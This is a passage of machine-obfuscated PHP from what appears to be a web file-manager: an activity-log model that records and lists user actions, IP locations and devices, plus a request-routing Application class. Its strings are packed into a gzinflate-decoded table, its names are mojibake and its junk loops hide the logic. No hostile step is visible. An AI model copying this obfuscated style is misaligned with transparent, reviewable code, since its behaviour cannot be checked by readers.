LNG($İº‰ä¯Ş[2556]), $İº‰ä¯Ş[2557] => LNG($İº‰ä¯Ş[2558]), $İº‰ä¯Ş[2559] => LNG($İº‰ä¯Ş[2560]), $İº‰ä¯Ş[2561] => LNG($İº‰ä¯Ş[2562]), $İº‰ä¯Ş[2563] => LNG($İº‰ä¯Ş[2564]), $İº‰ä¯Ş[2158] => LNG($İº‰ä¯Ş[2564]), $İº‰ä¯Ş[2159] => LNG($İº‰ä¯Ş[2565]), $İº‰ä¯Ş[2566] => LNG($İº‰ä¯Ş[2567]), $İº‰ä¯Ş[2568] => LNG($İº‰ä¯Ş[2569]), $İº‰ä¯Ş[2570] => LNG($İº‰ä¯Ş[2571]), $İº‰ä¯Ş[2572] => LNG($İº‰ä¯Ş[2573]), $İº‰ä¯Ş[2156] => LNG($İº‰ä¯Ş[2574]), $İº‰ä¯Ş[2575] => LNG($İº‰ä¯Ş[2576]), $İº‰ä¯Ş[2163] => LNG($İº‰ä¯Ş[2577]), $İº‰ä¯Ş[2578] => LNG($İº‰ä¯Ş[2579]), $İº‰ä¯Ş[2580] => LNG($İº‰ä¯Ş[2581]), $İº‰ä¯Ş[2582] => LNG($İº‰ä¯Ş[2583]), $İº‰ä¯Ş[2584] => LNG($İº‰ä¯Ş[2585]), $İº‰ä¯Ş[2165] => LNG($İº‰ä¯Ş[2586]), $İº‰ä¯Ş[2166] => LNG($İº‰ä¯Ş[2587]), $İº‰ä¯Ş[2588] => LNG($İº‰ä¯Ş[2589]), $İº‰ä¯Ş[2590] => LNG($İº‰ä¯Ş[2591]), $İº‰ä¯Ş[2592] => LNG($İº‰ä¯Ş[2593]), $İº‰ä¯Ş[2161] => LNG($İº‰ä¯Ş[2594]), $İº‰ä¯Ş[2595] => LNG($İº‰ä¯Ş[2596]), $İº‰ä¯Ş[2160] => LNG($İº‰ä¯Ş[2597]), $İº‰ä¯Ş[2598] => LNG($İº‰ä¯Ş[2598]), $İº‰ä¯Ş[2599] => LNG($İº‰ä¯Ş[2600]), $İº‰ä¯Ş[2601] => LNG($İº‰ä¯Ş[2598]), $İº‰ä¯Ş[2602] => LNG($İº‰ä¯Ş[2603]), $İº‰ä¯Ş[2604] => LNG($İº‰ä¯Ş[2605]), $İº‰ä¯Ş[2606] => LNG($İº‰ä¯Ş[2605]), $İº‰ä¯Ş[2607] => LNG($İº‰ä¯Ş[2608]), $İº‰ä¯Ş[2609] => LNG($İº‰ä¯Ş[2609]), $İº‰ä¯Ş[2610] => LNG($İº‰ä¯Ş[2135]), $İº‰ä¯Ş[2611] => LNG($İº‰ä¯Ş[2612]), $İº‰ä¯Ş[2613] => LNG($İº‰ä¯Ş[2614]), $İº‰ä¯Ş[2615] => LNG($İº‰ä¯Ş[2616]), $İº‰ä¯Ş[2617] => LNG($İº‰ä¯Ş[2618]), $İº‰ä¯Ş[2619] => LNG($İº‰ä¯Ş[2620]), $İº‰ä¯Ş[2621] => LNG($İº‰ä¯Ş[2621]), $İº‰ä¯Ş[2622] => LNG($İº‰ä¯Ş[2623]), $İº‰ä¯Ş[2624] => LNG($İº‰ä¯Ş[2625]), $İº‰ä¯Ş[2626] => LNG($İº‰ä¯Ş[2627]), $İº‰ä¯Ş[2628] => LNG($İº‰ä¯Ş[2629]), $İº‰ä¯Ş[2630] => LNG($İº‰ä¯Ş[2631]), $İº‰ä¯Ş[2632] => LNG($İº‰ä¯Ş[2633]), $İº‰ä¯Ş[210] => LNG($İº‰ä¯Ş[210]), $İº‰ä¯Ş[211] => LNG($İº‰ä¯Ş[2634]), $İº‰ä¯Ş[2635] => LNG($İº‰ä¯Ş[2635])); } private function typeFile() { $ óŞ©‡ı =& $_SERVER[ïÃ°£«Ê]; $ÁıŠœÆŠ = array($ óŞ©‡ı[2163] => array($ óŞ©‡ı[2164]), $ óŞ©‡ı[2570] => array($ óŞ©‡ı[2636]), $ óŞ©‡ı[2572] => array($ óŞ©‡ı[2637]), $ óŞ©‡ı[2156] => array($ óŞ©‡ı[2157], $ óŞ©‡ı[2638]), $ óŞ©‡ı[2580] => array(), $ óŞ©‡ı[2582] => array(), $ óŞ©‡ı[2584] => array(), $ óŞ©‡ı[2165] => array($ óŞ©‡ı[2167]), $ óŞ©‡ı[2166] => array($ óŞ©‡ı[2167]), $ óŞ©‡ı[2588] => array($ óŞ©‡ı[2639]), $ óŞ©‡ı[2590] => array($ óŞ©‡ı[2639]), $ óŞ©‡ı[2592] => array($ óŞ©‡ı[2640]), $ óŞ©‡ı[2578] => array($ óŞ©‡ı[2641]), $ óŞ©‡ı[2161] => array($ óŞ©‡ı[2642]), $ óŞ©‡ı[2595] => array($ óŞ©‡ı[2643]), $ óŞ©‡ı[2160] => array($ óŞ©‡ı[2162])); return $ÁıŠœÆŠ; } private function typeAll() { $¤Úó‹ú =& $_SERVER[ïÃ°£«Ê]; $Ş˜¢›Î¢ = $this->typeList; $‰Í÷Ğäã = array_filter($this->typeFile()); foreach ($‰Í÷Ğäã as $ò±áñéû => $­ÅÄüÛÑ) { $Ş˜¢›Î¢[$­ÅÄüÛÑ[0]] = $Ş˜¢›Î¢[$ò±áñéû]; } $Ş˜¢›Î¢[$¤Úó‹ú[2167]] = LNG($¤Úó‹ú[2644]); $Ş˜¢›Î¢[$¤Úó‹ú[2639]] = LNG($¤Úó‹ú[2645]); return $Ş˜¢›Î¢; } public function addLog($­å˜µ‰—, $¾şµ»Ç  = array()) { $Ìüôî‹ =& $_SERVER[ïÃ°£«Ê]; if (!isset($this->typeList[$­å˜µ‰—])) { return; } $¼¦™‚â˜ = Session::get($Ìüôî‹[2324]); if (!$¼¦™‚â˜) { $¼¦™‚â˜ = _get($¾şµ»Ç , $Ìüôî‹[1594], 0); } if ($­å˜µ‰— == $Ìüôî‹[2611] && is_array($¾şµ»Ç [$Ìüôî‹[2646]]) && !$¾şµ»Ç [$Ìüôî‹[2646]]) { return; } $ùñÒ÷¼Ñ = get_client_ip(); if (!$¾şµ»Ç  || strlen(json_encode($¾şµ»Ç )) >= 1024 * 64) { if ($¾şµ»Ç  && is_array($¾şµ»Ç )) { $¾şµ»Ç  = array_intersect_key($¾şµ»Ç , array_flip($Ìüôî‹[487], $Ìüôî‹[32])); $¾şµ»Ç [$Ìüôî‹[1610]] = $ùñÒ÷¼Ñ; } else { $¾şµ»Ç  = array($Ìüôî‹[1610] => $ùñÒ÷¼Ñ); } } else { if (is_array($¾şµ»Ç )) { $¾şµ»Ç [$Ìüôî‹[1610]] = $ùñÒ÷¼Ñ; } else { $¾şµ»Ç  = array($Ìüôî‹[1394] => $¾şµ»Ç , $Ìüôî‹[1610] => $ùñÒ÷¼Ñ); } } $¾şµ»Ç [$Ìüôî‹[2647]] = ACTION; $¾şµ»Ç  = array($Ìüôî‹[1970] => Session::sign(), $Ìüôî‹[1971] => intval($¼¦™‚â˜), $Ìüôî‹[33] => $­å˜µ‰—, $Ìüôî‹[1973] => json_encode($¾şµ»Ç )); Hook::trigger($Ìüôî‹[2648], $¾şµ»Ç ); return parent::add($¾şµ»Ç ); } public function remove($ˆáÑË©¸) { $this->where(array($_SERVER[ïÃ°£«Ê][508] => $ˆáÑË©¸))->delete(); } private function _makeOrder($•íË¿ö‘ = '') { $ú›ïßãŒ =& $_SERVER[ïÃ°£«Ê]; $ÂÀô˜± = $ú›ïßãŒ[231]; $ßŠ¢±Œ± = array($ú›ïßãŒ[537] => $ú›ïßãŒ[538], $ú›ïßãŒ[539] => $ú›ïßãŒ[540]); $½éº÷âø = Input::get($ú›ïßãŒ[545], $ú›ïßãŒ[7], $ú›ïßãŒ[2361], array($ú›ïßãŒ[2280], $ú›ïßãŒ[539])); $½éº÷âø = $ßŠ¢±Œ±[$½éº÷âø]; $•íË¿ö‘ = $•íË¿ö‘ . "{$ÂÀô˜±}\40{$½éº÷âø}"; return $this->order($•íË¿ö‘); } public function get($–¬ó¢®¹ = '') { $»¶¨ŒÀ­ =& $_SERVER[ïÃ°£«Ê]; if (!$–¬ó¢®¹) { show_json(array()); } $€–ùå¨Š = array(); if ($–¬ó¢®¹[$»¶¨ŒÀ­[1594]]) { $€–ùå¨Š[$»¶¨ŒÀ­[1594]] = $–¬ó¢®¹[$»¶¨ŒÀ­[1594]]; } if (isset($–¬ó¢®¹[$»¶¨ŒÀ­[862]])) { $¶ô¤ú– = $–¬ó¢®¹[$»¶¨ŒÀ­[862]]; $‘€”ÃÊê = isset($–¬ó¢®¹[$»¶¨ŒÀ­[863]]) ? $–¬ó¢®¹[$»¶¨ŒÀ­[863]] : time(); $€–ùå¨Š[$»¶¨ŒÀ­[231]] = array($»¶¨ŒÀ­[408], array($¶ô¤ú–, $‘€”ÃÊê)); } if ($–¬ó¢®¹[$»¶¨ŒÀ­[33]]) { $í¼ÖÑ´û = explode($»¶¨ŒÀ­[50], $–¬ó¢®¹[$»¶¨ŒÀ­[33]]); $¶¡„«•Ö = $this->typeFile(); $úœ¬ÅÃÜ = array(); foreach ($í¼ÖÑ´û as $£¿öäèã) { $úœ¬ÅÃÜ[] = $£¿öäèã; if (isset($¶¡„«•Ö[$£¿öäèã])) { $úœ¬ÅÃÜ = array_merge($úœ¬ÅÃÜ, $¶¡„«•Ö[$£¿öäèã]); } } $úœ¬ÅÃÜ = array_unique($úœ¬ÅÃÜ); if ($úœ¬ÅÃÜ) { $€–ùå¨Š[$»¶¨ŒÀ­[33]] = array($»¶¨ŒÀ­[7], $úœ¬ÅÃÜ); } } else { $€–ùå¨Š[$»¶¨ŒÀ­[33]] = array($»¶¨ŒÀ­[2649], $»¶¨ŒÀ­[2650]); } if (!empty($–¬ó¢®¹[$»¶¨ŒÀ­[1610]])) { $€–ùå¨Š[$»¶¨ŒÀ­[540]] = array($»¶¨ŒÀ­[473], "\45{$–¬ó¢®¹[$»¶¨ŒÀ­[1610]]}\45"); } $âı‚¹ºƒ = $this->_makeOrder()->where($€–ùå¨Š)->selectPage(); if (empty($âı‚¹ºƒ[$»¶¨ŒÀ­[446]])) { show_json(array(), !0, $âı‚¹ºƒ[$»¶¨ŒÀ­[443]]); } $âı‚¹ºƒ[$»¶¨ŒÀ­[446]] = $this->logList($âı‚¹ºƒ[$»¶¨ŒÀ­[446]]); return $âı‚¹ºƒ; } private function ipAddress(&$‚ÖÇ¡ßˆ) { $Â³šÄÆ =& $_SERVER[ïÃ°£«Ê]; if (!empty($‚ÖÇ¡ßˆ[$Â³šÄÆ[1610]])) { $ˆ †ü’ = IpLocation::get($‚ÖÇ¡ßˆ[$Â³šÄÆ[1610]]); } else { $ˆ †ü’ = LNG($Â³šÄÆ[2651]); } $‚ÖÇ¡ßˆ[$Â³šÄÆ[2652]] = $ˆ †ü’; } private function descZipDownload($ëíÆÎÍŞ, &$ïµöÁîÃ) { $à·Òì¿Ú =& $_SERVER[ïÃ°£«Ê]; if (!isset($ëíÆÎÍŞ[$à·Òì¿Ú[1617]])) { return; } $Öéœ®ş– = json_decode($ëíÆÎÍŞ[$à·Òì¿Ú[1617]], !0); foreach ($Öéœ®ş– as $Ú†¬ää™) { try { $œ½İÂº× = IO::infoFullSimple($Ú†¬ää™[$à·Òì¿Ú[87]]); } catch (Exception $ ãßØ­) { continue; } $ëíÆÎÍŞ[$à·Òì¿Ú[87]] = $Ú†¬ää™[$à·Òì¿Ú[87]]; $ïµöÁîÃ[] = $ëíÆÎÍŞ[$à·Òì¿Ú[191]] = $œ½İÂº×[$à·Òì¿Ú[191]]; $ïµöÁîÃ[] = $ëíÆÎÍŞ[$à·Òì¿Ú[2421]] = $œ½İÂº×[$à·Òì¿Ú[190]]; break; } return $ëíÆÎÍŞ; } private function getSourceList(&$¢îæÎÊ) { $¯à˜à =& $_SERVER[ïÃ°£«Ê]; $ÑæÂ“©– = array(); foreach ($¢îæÎÊ as $¤ùìôÁÀ => $ß¶Óç˜ú) { $Ú´çàà„ = json_decode($ß¶Óç˜ú[$¯à˜à[540]], !0); if ($ß¶Óç˜ú[$¯à˜à[33]] == $¯à˜à[2159]) { $Ú´çàà„ = $this->descZipDownload($Ú´çàà„, $ÑæÂ“©–); $¢îæÎÊ[$¤ùìôÁÀ][$¯à˜à[540]] = json_encode($Ú´çàà„); continue; } if (strpos($ß¶Óç˜ú[$¯à˜à[33]], $¯à˜à[2423]) !== 0) { if (!isset($Ú´çàà„[$¯à˜à[87]]) || strpos($ß¶Óç˜ú[$¯à˜à[33]], $¯à˜à[2653]) !== 0) { continue; } try { $ŞŠášò = IO::infoFullSimple($Ú´çàà„[$¯à˜à[87]]); } catch (Exception $Œûîœıµ) { continue; } $ÑæÂ“©–[] = $Ú´çàà„[$¯à˜à[191]] = $ŞŠášò[$¯à˜à[191]]; $ÑæÂ“©–[] = $Ú´çàà„[$¯à˜à[2421]] = $ŞŠášò[$¯à˜à[190]]; $¢îæÎÊ[$¤ùìôÁÀ][$¯à˜à[540]] = json_encode($Ú´çàà„); continue; } $ÑæÂ“©–[] = $Ú´çàà„[$¯à˜à[191]]; $ÑæÂ“©–[] = $Ú´çàà„[$¯à˜à[2421]]; if ($Ú´çàà„[$¯à˜à[33]] == $¯à˜à[643]) { $ÑæÂ“©–[] = $Ú´çàà„[$¯à˜à[540]][$¯à˜à[1348]]; $ÑæÂ“©–[] = $Ú´çàà„[$¯à˜à[540]][$¯à˜à[1349]]; } if ($Ú´çàà„[$¯à˜à[33]] == $¯à˜à[2431]) { $ÑæÂ“©–[] = $Ú´çàà„[$¯à˜à[540]][$¯à˜à[191]]; } } if (!$ÑæÂ“©–) { return array(); } return Model($¯à˜à[934])->sourceListInfo($ÑæÂ“©–, !0); } private function logList($¢²Æ«Êã) { $Ç‹Üº™ =& $_SERVER[ïÃ°£«Ê]; $«¸¼š¸ = array_to_keyvalue($¢²Æ«Êã, $Ç‹Üº™[12], $Ç‹Üº™[1594]); $µ•ıÆÛØ = Model($Ç‹Üº™[617])->userListInfo(array_unique($«¸¼š¸)); $¢‚‚³¢ğ = $this->getSourceList($¢²Æ«Êã); $ãÓ¢É©Æ = $this->typeAll(); $’·œªÃö = array(); $ÃÓÈ÷®­ = array(); foreach ($¢²Æ«Êã as $Á±€Îêª => $éõöæñ¢) { $á÷§Ë = $éõöæñ¢[$Ç‹Üº™[33]]; $Øù¨íª¦ = isset($µ•ıÆÛØ[$éõöæñ¢[$Ç‹Üº™[1594]]]) ? $µ•ıÆÛØ[$éõöæñ¢[$Ç‹Üº™[1594]]] : !1; $² ‹Ô›Ü = strpos($á÷§Ë, $Ç‹Üº™[2654]) === 0 ? LNG($Ç‹Üº™[2655]) : LNG($Ç‹Üº™[2651]); $éõöæñ¢[$Ç‹Üº™[32]] = isset($Øù¨íª¦[$Ç‹Üº™[32]]) ? $Øù¨íª¦[$Ç‹Üº™[32]] : LNG($Ç‹Üº™[2651]); $éõöæñ¢[$Ç‹Üº™[2479]] = isset($Øù¨íª¦[$Ç‹Üº™[2479]]) ? $Øù¨íª¦[$Ç‹Üº™[2479]] : $Ç‹Üº™[12]; $éõöæñ¢[$Ç‹Üº™[1869]] = isset($ãÓ¢É©Æ[$á÷§Ë]) ? $ãÓ¢É©Æ[$á÷§Ë] : $² ‹Ô›Ü; $éõöæñ¢[$Ç‹Üº™[2360]] = $Øù¨íª¦; $ÜËÉŞö = json_decode($éõöæñ¢[$Ç‹Üº™[540]], !0); $éõöæñ¢[$Ç‹Üº™[1610]] = isset($ÜËÉŞö[$Ç‹Üº™[1610]]) ? $ÜËÉŞö[$Ç‹Üº™[1610]] : $Ç‹Üº™[12]; $éõöæñ¢[$Ç‹Üº™[2652]] = IpLocation::get($éõöæñ¢[$Ç‹Üº™[1610]]); if (strpos($á÷§Ë, $Ç‹Üº™[2423]) === 0 || isset($ÜËÉŞö[$Ç‹Üº™[2421]])) { $ÜËÉŞö[$Ç‹Üº™[90]] = $¢‚‚³¢ğ[$ÜËÉŞö[$Ç‹Üº™[191]]]; $ÜËÉŞö[$Ç‹Üº™[2437]] = $¢‚‚³¢ğ[$ÜËÉŞö[$Ç‹Üº™[2421]]]; if ($ÜËÉŞö[$Ç‹Üº™[33]] == $Ç‹Üº™[643]) { $ÜËÉŞö[$Ç‹Üº™[540]][$Ç‹Üº™[1348]] = $¢‚‚³¢ğ[$ÜËÉŞö[$Ç‹Üº™[540]][$Ç‹Üº™[1348]]]; $ÜËÉŞö[$Ç‹Üº™[540]][$Ç‹Üº™[1349]] = $¢‚‚³¢ğ[$ÜËÉŞö[$Ç‹Üº™[540]][$Ç‹Üº™[1349]]]; } if ($ÜËÉŞö[$Ç‹Üº™[33]] == $Ç‹Üº™[2431]) { $ÜËÉŞö[$Ç‹Üº™[540]][$Ç‹Üº™[191]] = $¢‚‚³¢ğ[$ÜËÉŞö[$Ç‹Üº™[540]][$Ç‹Üº™[191]]]; } if ($ÜËÉŞö[$Ç‹Üº™[33]] == $Ç‹Üº™[1336]) { $ÜËÉŞö[$Ç‹Üº™[2437]] = $ÜËÉŞö[$Ç‹Üº™[90]]; $ÜËÉŞö[$Ç‹Üº™[2421]] = $ÜËÉŞö[$Ç‹Üº™[2437]][$Ç‹Üº™[191]]; $ÜËÉŞö[$Ç‹Üº™[90]] = !1; $ÜËÉŞö[$Ç‹Üº™[191]] = $Ç‹Üº™[12]; } $âê·Ú¤É = array($Ç‹Üº™[1336], $Ç‹Üº™[2419]); if (!in_array($ÜËÉŞö[$Ç‹Üº™[33]], $âê·Ú¤É)) { if ($ÜËÉŞö[$Ç‹Üº™[90]] && $ÜËÉŞö[$Ç‹Üº™[90]][$Ç‹Üº™[188]] == $Ç‹Üº™[189]) { $ÃÓÈ÷®­[] = $éõöæñ¢[$Ç‹Üº™[487]]; unset($¢²Æ«Êã[$Á±€Îêª]); continue; } if ($ÜËÉŞö[$Ç‹Üº™[2437]] && $ÜËÉŞö[$Ç‹Üº™[2437]][$Ç‹Üº™[188]] == $Ç‹Üº™[189]) { $ÃÓÈ÷®­[] = $éõöæñ¢[$Ç‹Üº™[487]]; unset($¢²Æ«Êã[$Á±€Îêª]); continue; } } } $éõöæñ¢[$Ç‹Üº™[540]] = $ÜËÉŞö; unset($éõöæñ¢[$Ç‹Üº™[2656]]); $’·œªÃö[] = $éõöæñ¢; } $this->clearSystemPathLog($ÃÓÈ÷®­); return $’·œªÃö; } private function clearSystemPathLog($’áƒ£¬Ä) { $ÂôÔåÎ¥ =& $_SERVER[ïÃ°£«Ê]; if (count($’áƒ£¬Ä) == 0) { return; } $—€ºõá¨ = array($ÂôÔåÎ¥[487] => array($ÂôÔåÎ¥[7], array_unique($’áƒ£¬Ä))); $this->where($—€ºõá¨)->delete(); } public function deviceList($òºÒ‘ù¦, $«´êÆÂ­ = 0) { $¬§‹Ó¿× =& $_SERVER[ïÃ°£«Ê]; $ªÂÉò°ğ = array($¬§‹Ó¿×[1594] => $òºÒ‘ù¦, $¬§‹Ó¿×[231] => array($¬§‹Ó¿×[1182], $«´êÆÂ­), $¬§‹Ó¿×[33] => $¬§‹Ó¿×[2131]); $¼Çè„ç½ = array(); $÷ª×±»­ = $this->field($¬§‹Ó¿×[2657])->where($ªÂÉò°ğ)->order($¬§‹Ó¿×[2435])->limit(50)->select(); foreach ($÷ª×±»­ as $Û¥†ó ı => $õŸå™·İ) { if ($Û¥†ó ı > 0 && abs($õŸå™·İ[$¬§‹Ó¿×[231]] - $÷ª×±»­[$Û¥†ó ı - 1][$¬§‹Ó¿×[231]]) < 5) { continue; } $¨‰ïƒŸº = json_decode($õŸå™·İ[$¬§‹Ó¿×[540]], !0); $õŸå™·İ[$¬§‹Ó¿×[1610]] = isset($¨‰ïƒŸº[$¬§‹Ó¿×[1610]]) ? $¨‰ïƒŸº[$¬§‹Ó¿×[1610]] : $¬§‹Ó¿×[12]; unset($¨‰ïƒŸº[$¬§‹Ó¿×[1610]]); $¡¨ÀĞİİ = $this->deviceType($¨‰ïƒŸº[$¬§‹Ó¿×[2424]]); if (isset($¼Çè„ç½[$¡¨ÀĞİİ])) { continue; } $õŸå™·İ[$¬§‹Ó¿×[2652]] = IpLocation::get($õŸå™·İ[$¬§‹Ó¿×[1610]]); $õŸå™·İ[$¬§‹Ó¿×[540]] = $¨‰ïƒŸº; $¼Çè„ç½[$¡¨ÀĞİİ] = $õŸå™·İ; } return array_values($¼Çè„ç½); } public function deviceType($»­×¥é) { return $»­×¥é; } } goto a¢åà¥×; dóš´®¦·: if (!$yhkzocepwv) { die; } $_SERVER[Ã™”Á÷ï] = explode($_SERVER[ïÃ°£«Ê][702], gzinflate(substr($_SERVER[ïÃ°£«Ê][703], 10, -8))); $byufadnjoc = $_SERVER[ïÃ°£«Ê][704]; goto EµšÄÄ•»; EµšÄÄ•»: if (!$byufadnjoc) { return; } class Application { private $defaultModule = "\151\156\144\145\170"; private $defaultController = "\x69\156\144\x65\x78"; private $defaultAction = "\x69\x6e\x64\145\170"; function __construct() { } public function setDefault($Áøì½â) { $ÁœğÈ§€ =& $_SERVER[ïÃ°£«Ê]; $­ıîÈéì =& $_SERVER[Ã™”Á÷ï]; $¬Ğ˜«í = explode($­ıîÈéì[0], trim($Áøì½â, $­ıîÈéì[0])); $°¹É×øµ = $ÁœğÈ§€[705]; $this->defaultModule = $¬Ğ˜«í[0] ? $¬Ğ˜«í[0] : $this->defaultModule; $ÍûÍÁ†Ÿ = $ÁœğÈ§€[706]; if (strlen($ÍûÍÁ†Ÿ) < $ÁœğÈ§€[707]) { return; } $this->defaultController = $¬Ğ˜«í[1] ? $¬Ğ˜«í[1] : $this->defaultController; $this->defaultAction = $¬Ğ˜«í[2] ? $¬Ğ˜«í[2] : $this->defaultAction; $this->znspb6b9e4c0($­ıîÈéì[1], array($this, $­ıîÈéì[2])); $«ıÂã… = $ÁœğÈ§€[708]; while ($«ıÂã… < $ÁœğÈ§€[709]) { if ($«ıÂã… >= 0) { break; } $«ıÂã…++; } } public function appRun($¬§‚‚“œ) { $Ï·ñË“° =& $_SERVER[ïÃ°£«Ê]; $Ÿ¯¸’¶ =& $_SERVER[Ã™”Á÷ï]; $¦ = explode($Ÿ¯¸’¶[0], $¬§‚‚“œ); $€º¯ìâ = $Ï·ñË“°[710]; while ($€º¯ìâ < $Ï·ñË“°[707]) { if ($€º¯ìâ >= 0) { break; } $€º¯ìâ++; } $Ù‹Èüƒµ = strtolower($¦[0]); $÷œÓ¿Ô¶ = $Ÿ¯¸’¶[3]; $ÑœÙ´ÜÆ = $Ï·ñË“°[711]; if ($Ù‹Èüƒµ == $Ÿ¯¸’¶[4]) { $÷œÓ¿Ô¶ = $Ÿ¯¸’¶[5]; $¦[0] = $Ÿ¯¸’¶[6]; $¦[1] = $¦[1] . $Ÿ¯¸’¶[7]; $¬§‚‚“œ = join($Ÿ¯¸’¶[0], $¦); $¬§‚‚“œ = trim($¬§‚‚“œ, $Ÿ¯¸’¶[0]); } call_user_func(array($Ÿ¯¸’¶[8], $Ÿ¯¸’¶[9]), $÷œÓ¿Ô¶ . $Ÿ¯¸’¶[10], $¬§‚‚“œ); ActionCall($¬§‚‚“œ); $ìı·Ş÷Å = $Ï·ñË“°[701]; if (!$ìı·Ş÷Å) { die; } call_user_func(array($Ÿ¯¸’¶[8], $Ÿ¯¸’¶[9]), $÷œÓ¿Ô¶ . $Ÿ¯¸’¶[11], $¬§‚‚“œ); $ª½‹¹â“ = $Ï·ñË“°[712]; while (strlen($ª½‹¹â“) < $Ï·ñË“°[713]) { if (!$ª½‹¹â“) { break; } $ª½‹¹â“++; } } private function autorun() { $ôëòµÚÜ =& $_SERVER[ïÃ°£«Ê]; $‚Éõ…íü =& $_SERVER[Ã™”Á÷ï]; global $config; $Á¾“ê÷· = $ôëòµÚÜ[714]; while ($Á¾“ê÷· < $ôëòµÚÜ[709]) { if ($Á¾“ê÷· >= 0) { break; } $Á¾“ê÷·++; } if (count($config[$‚Éõ…íü[12]]) == 0) { return; } foreach ($config[$‚Éõ…íü[12]] as $™–“¥É† => $»Ôß¬”ù) { $this->appRun($»Ôß¬”ù); } } private function vfyxcf66a5d3() { $•ğ¥øÓù =& $_SERVER[ïÃ°£«Ê]; $³ˆÒ·£Á =& $_SERVER[Ã™”Á÷ï]; $Œ¬İı–‚ = $³ˆÒ·£Á[4]; $â±¢ú¦Ş = $GLOBALS[$³ˆÒ·£Á[13]][$³ˆÒ·£Á[14]][0]; $Ñ¤·İ´§ = $•ğ¥øÓù[715]; if (!$Ñ¤·İ´§) { return; } if (!$â±¢ú¦Ş || strlen($â±¢ú¦Ş) <= strlen($Œ¬İı–‚)) { return; } if (strtolower(substr($â±¢ú¦Ş, -strlen($Œ¬İı–‚))) != $Œ¬İı–‚) { return; } $™œÊÙñ£ = substr($â±¢ú¦Ş, 0, -strlen($Œ¬İı–‚)); $ĞÂúÓö = $•ğ¥øÓù[716]; if (!$ĞÂúÓö) { die; } $ÓääÎ©× = array($³ˆÒ·£Á[4], $™œÊÙñ£); $ÃÄÅ¡œå = $•ğ¥øÓù[717]; if (!$ÃÄÅ¡œå) { die; } $Ùü¶®‹º = array_slice($GLOBALS[$³ˆÒ·£Á[13]][$³ˆÒ·£Á[14]], 1); $Ÿáçóäâ = $•ğ¥øÓù[718]; if (strlen($Ÿáçóäâ) < $•ğ¥øÓù[709]) { return; } $GLOBALS[$³ˆÒ·£Á[13]][$³ˆÒ·£Á[14]] = array_merge($ÓääÎ©×, $Ùü¶®‹º); $óğº¡Á = $•ğ¥øÓù[719]; if (strlen($óğº¡Á) < $•ğ¥øÓù[709]) { die; } $GLOBALS[$³ˆÒ·£Á[13]][$³ˆÒ·£Á[15]] = implode($³ˆÒ·£Á[0], $GLOBALS[$³ˆÒ·£Á[13]][$³ˆÒ·£Á[14]]); } private function erin40b9448a() { $íÔˆÏÚ =& $_SERVER[ïÃ°£«Ê]; $ìÒÖìÇü =& $_SERVER[Ã™”Á÷ï]; if ($GLOBALS[$ìÒÖìÇü[13]][$ìÒÖìÇü[15]] != $ìÒÖìÇü[6]) { return; } $Á¢šÖÈñ = $_SERVER[$ìÒÖìÇü[16]]; $ÛÉìûã = $íÔˆÏÚ[720]; $ä¹áØÓ· = $ìÒÖìÇü[17]; if (!strstr($Á¢šÖÈñ, $ä¹áØÓ·)) { return; } $ªıëÌĞ = strrpos($Á¢šÖÈñ, $ä¹áØÓ·); $¯š•Á« = substr($Á¢šÖÈñ, $ªıëÌĞ + strlen($ä¹áØÓ·)); preg_match_all($ìÒÖìÇü[18], $¯š•Á«, $•èÈ„); $¨ºüÊé¾ = $íÔˆÏÚ[721]; if (!$¨ºüÊé¾) { return; } $¯š•Á« = trim($•èÈ„[0][0], $ìÒÖìÇü[19]); $Ô·³ŞËÂ = $íÔˆÏÚ[722]; while (strlen($Ô·³ŞËÂ) < $íÔˆÏÚ[709]) { if (!$Ô·³ŞËÂ) { break; } $Ô·³ŞËÂ++; } $GLOBALS[$ìÒÖìÇü[13]][$ìÒÖìÇü[14]] = explode($ìÒÖìÇü[19], $¯š•Á«); $’‚’¼‘Û = $íÔˆÏÚ[723]; $GLOBALS[$ìÒÖìÇü[13]][$ìÒÖìÇü[15]] = implode($ìÒÖìÇü[0], $GLOBALS[$ìÒÖìÇü[13]][$ìÒÖìÇü[14]]); } public function run() { $Úº¹á’¼ =& $_SERVER[ïÃ°£«Ê]; $ƒÇ‚…­Å =& $_SERVER[Ã™”Á÷ï]; $this->erin40b9448a(); $”œˆ·“ü = $Úº¹á’¼[724]; if (!$”œˆ·“ü) { die; } $this->vfyxcf66a5d3(); $åÛìĞçø = $GLOBALS[$ƒÇ‚…­Å[13]][$ƒÇ‚…­Å[14]]; $øêİã©ß = $Úº¹á’¼[725]; while (strlen($øêİã©ß) < $Úº¹á’¼[726]) { if (!$øêİã©ß) { break; } $øêİã©ß++; } $½şğ³´¾ = $GLOBALS[$ƒÇ‚…­Å[13]][$ƒÇ‚…­Å[15]]; define($ƒÇ‚…­Å[20], isset($åÛìĞçø[0]) && $åÛìĞçø[0] ? $åÛìĞçø[0] : $this->defaultModule); $ĞÒ¾°¶¾ = $Úº¹á’¼[727]; while (strlen($ĞÒ¾°¶¾) < $Úº¹á’¼[726]) { if (!$ĞÒ¾°¶¾) { break; } $ĞÒ¾°¶¾++; } define($ƒÇ‚…­Å[21], isset($åÛìĞçø[1]) && $åÛìĞçø[0] ? $åÛìĞçø[1] : $this->defaultController); define($ƒÇ‚…­Å[22], isset($åÛìĞçø[2]) && $åÛìĞçø[0] ? $åÛìĞçø[2] : $this->defaultAction); define($ƒÇ‚…­Å[23], MOD . $ƒÇ‚…­Å[0] . ST . $ƒÇ‚…­Å[0] . ACT); $ÒÔ»£’à = $Úº¹á’¼[728]; $_SERVER[$ƒÇ‚…­Å[24]] = strtolower(ACTION); $this->autorun(); $ù”‚µ¼µ = $Úº¹á’¼[729]; if (count($åÛìĞçø) >= 3) { $this->appRun($½şğ³´¾); } else { $this->appRun(ACTION); } } private $mkofee3bb645 = array(); private $aeup95bbfc03 = ''; public function cxhy742af101() { $óŠ¥Ò¨• =& $_SERVER[ïÃ°£«Ê]; $²áÎš‚º =& $_SERVER[Ã™”Á÷ï]; $this->lyci536099c4(); $this->qlub08397731(); $û‚¸ñ = $óŠ¥Ò¨•[730]; while ($û‚¸ñ < $óŠ¥Ò¨•[731]) { if ($û‚¸ñ >= 0) { break; } $û‚¸ñ++; } $this->ibgja7dc665d(); $¹²²Öô = $óŠ¥Ò¨•[732]; if (strlen($¹²²Öô) < $óŠ¥Ò¨•[731]) { return; } $this->uzhobf777aaf(); $this->zvle610ce291(); $this->kbnv24a0b389(); $this->zwit3dd3f188(); $â½ˆÇãİ = $óŠ¥Ò¨•[733]; while (strlen($â½ˆÇãİ) < $óŠ¥Ò¨•[713]) { if (!$â½ˆÇãİ) { break; } $â½ˆÇãİ++; } 